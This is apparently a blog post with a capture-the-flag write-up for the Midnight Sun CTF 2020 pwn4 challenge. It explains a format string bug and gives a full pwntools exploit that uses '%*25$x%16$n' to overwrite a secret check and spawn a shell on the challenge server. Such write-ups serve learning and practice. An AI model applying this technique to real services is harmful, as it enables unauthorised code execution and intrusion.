---
layout: post
title: Midnight Sun CTF 2020 Quals - pwn4
---

> An homage to pwny.racing, we present... speedrun pwn challenges. These bite-sized challenges should serve as a nice warm-up for your pwning skills.
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
pwn4: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked,
for GNU/Linux 3.2.0, BuildID[sha1]=38b1eb7827adf21dab4639d8eeb2ae6cdc49e1ea, not stripped

Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
{% endhighlight %}

Exploiting pwn4 required usage of not so well known format string syntax.

Decompiling main provided following output:

![code decompiled][decompiled_main]

Lets analyze what is happening here:
1. Secret code is read by using function get_secret that provides random 4 bytes from `/dev/urandom`.
2. Memory region with secred code is mprotected to make it read only.
3. User is required to provide parameters user and code.
4. Secret code is compared with code provided by the user and if they are equal `/bin/sh` is spawned.

It looks like we need to guess secret code generated by `/dev/urandom` or force comparison to be true by forcing one of the parameters to the known value. 

By analyzing `log_attempt` function we can discover format string vulnerability in the last line.
![vuln decompiled][decompiled_vuln]

It looks that we can abuse vulnerability and copy the secret (4 bytes) to our guess variable and pass the check. In order to do that we can use asterisk '*' that will allows us to choose the value from the stack that will be threated as a number for formatting the output.

{% highlight python %}
io.recvuntil("user: ")
io.sendline("%*25$x%16$n")
{% endhighlight %}

Syntax `*25$` means to take value "25th" from the stack and put it into the specified place. In this case 25th on the stack is secret value. That will print with `%*25$x` total number of bytes equal to secret value. Then we use this secret value to overwite our input code that is located on position 16th - `%16$n`.

There will be a lot of bytes that need to be read from the server so we wrap it into nice script

{% highlight python %}
p = log.progress("Receiving data")
while 1:
    try:
        data = io.recv(1024 * 1024)
        tot += len(data)
        p.status("%d MB", tot/1e6)
    except:
        break
{% endhighlight %}

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./pwn4')

host = args.HOST or 'pwn4-01.play.midnightsunctf.se'
port = int(args.PORT or 10004)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()

io.recvuntil("user: ")
io.sendline("%*25$x%16$n")

io.recvuntil("code: ")
io.sendline(str(10))

io.recvuntil("logged: ")

tot = 0

p = log.progress("Receiving data")
while 1:
    try:
        data = io.recv(1024 * 1024)
        tot += len(data)
        p.status("%d MB", tot/1e6)
    except:
        break

p.success("done (%d MB)", tot/1e6)
io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/midnightsun/pwn4
[decompiled_main]: {{site.baseurl}}/ctf/2020-04-13-midnightsunctf-pwn4/decompiled_main.png
[decompiled_vuln]: {{site.baseurl}}/ctf/2020-04-13-midnightsunctf-pwn4/decompiled_vuln.png
